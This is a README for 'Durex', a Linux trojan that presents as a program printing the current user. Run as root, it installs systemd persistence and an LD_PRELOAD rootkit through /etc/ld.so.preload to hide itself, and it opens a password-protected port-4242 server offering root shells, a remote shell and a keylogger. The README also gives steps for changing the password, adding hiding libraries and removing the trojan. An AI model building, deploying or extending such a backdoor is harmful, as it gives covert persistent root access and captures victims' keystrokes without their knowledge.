# DUREX
Simple Trojan

## INSTALLATION && USAGE
### As Normal User
```sh
$> make && ./Durex
JohnDoe
$>
```
Durex only print the user actually connected.

### As Root
```sh
$> make && ./Durex
root
$>
```
Durex only print the user actually connected... but Durex will also :

+ Create a _copy_ of himself in **/bin**
+ Create a _durex.service_ file in **/lib/systemd/system** to add himself as a service, launching himself at bootime as a deamon
+ Create a _durex.so_ library in **/usr/local/lib/** to hide himself and his functions from the system
+ Add this library in **/etc/ld.so.preload**
+ Create a _Durex.log_ file in **/var/log/**

Only one instance of Durex is created. And during his copy, Durex will changed a bit his behaviour allowing himself to :

+ Open a server on port *4242*, allowing *3* clients to connect to it
	+ The server is locked by a password
	+ The server offers to the clients:
		+ A shell as root
		+ A remote shell as root
		+ A keylogger

### Project has been tested on Debian 9.3.0 64bits.

## MODIFICATION
### Password generation
+ Generate a new password with the 'pass' executable:
```sh
$> make pass
cc -o pass other/passwd.c srcs/encrypt.c -I includes/
$> ./pass toto
toto (4): 191 248 92 67 189 94 197 184
$> ./pass kata
kata (4): 201 121 30 74 3 83 154 250
```
+ Use your best editor to modify **durex.h** :
```c
# define SERVER_PASS .. .. .. .. ..
```
+ Recompile

### Library

* Create your file and compile it
```sh
$> gcc -Wall -fPIC -shared -o ./Durex.so [myfile.c] -ldl
```
* If it compiles well, create the **hex** binary
```sh
$> make hex
cc -o hex other/txttohex.c -I includes/
$> ./hex [fichier.c]
\x23\x64\x65...
```
* Add the hexadecimal generated above in **includes/main.h**
```c
# define DUREX_MY_FILE		"/tmp/myfile.c"
# define DUREX_MY_SRC		"\x23\x64\x65\x66..."
```
* Finally add those defines in **src/library.c**
```c
int				install_library()
{
	char	*const files[] = { "gcc", "-Wall", "-fPIC", "-shared", "-o", DUREX_PROCESSHIDER_LIB,
							 DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_NEWFSTATAT_FILE,
							 DUREX_PCAP_FILE, DUREX_READDIR_FILE, DUREX_RECVMSG_FILE,
							 DUREX_RM_FILE, DUREX_XSTAT_FILE, \*DUREX_MY_FILE*\,
							 "-ldl", NULL };
	char	*const src[] = { NULL, NULL, NULL, NULL, NULL, NULL,
							 DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_NEWFSTATAT_SRC,
							 DUREX_PCAP_SRC, DUREX_READDIR_SRC, DUREX_RECVMSG_SRC,
							 DUREX_RM_SRC, DUREX_XSTAT_SRC, \*DUREX_MY_SRC*\ };
   ...
}
```
* Recompile the binary

### Dependencies
+ The only dependency is the libpcap package for packet capture:
```sh
$> sudo apt install libpcap-dev
```

### Deleting
+ If you had previously executed the binary has root you must :
	- Remove /etc/ld.so.preload
	- Stop the service durex
	- Disable the service durex
	- Remove /bin/Durex
	- Remove /lib/systemd/system/durex.service
	- Remove /var/log/Durex.log

+ I intentionnaly put no protection on deleting **/etc/ld.so.preload** to clean this up.
+ Read **lib_srcs/rm.c** to think about it. ;)

# AUTHOR
* gbourgeo
